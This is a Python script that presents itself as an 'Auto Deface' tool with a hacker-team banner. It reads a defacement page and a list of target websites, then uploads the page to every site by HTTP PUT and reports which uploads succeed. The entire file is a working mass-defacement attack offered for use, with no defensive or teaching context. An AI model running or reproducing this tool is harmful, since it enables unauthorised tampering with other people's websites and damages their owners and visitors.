#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """

\x1b[1;97m ▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░  \x1b[1;97m╔═════════════════════════╗
\x1b[1;97m ▐▓█\x1b[1;92mAuto░▀▄░░\x1b[1;97m█▓▌░█▄▄▄█░  \x1b[1;97m║ \x1b[1;93mAuthor   \x1b[1;91m: \x1b[1;92mMr.F47UR       \x1b[1;97m║
\x1b[1;97m ▐▓█\x1b[1;92m░Deface░░\x1b[1;97m█▓▌░█▄▄▄█░  \x1b[1;97m║\x1b[1;93m github   \x1b[1;91m: \x1b[1;92mMAMBORO22  \x1b[1;97m║
\x1b[1;97m ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█.███░  \x1b[1;97m║\x1b[1;93m WhatsApp\x1b[1;91m: \x1b[1;92m \x1b[1;97m║0812-4489-6793
\x1b[1;97m ░░░░▄▄███▄▄░└───█████░  \x1b[1;97m║ \x1b[1;93mTeam \x1b[1;91m: \x1b[1;92mATC    \x1b[1;97m║
\x1b[1;97m ════════════════════════\x1b[1;97m╩═════════════════════════╝
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("\x1b[1;96muploading file to ==> \x1b[1;93m%d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] \x1b[1;91m%s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] \x1b[1;92m%s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("\x1b[1;97mEnter your script deface name \x1b[1;93m:\x1b[1;92m ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
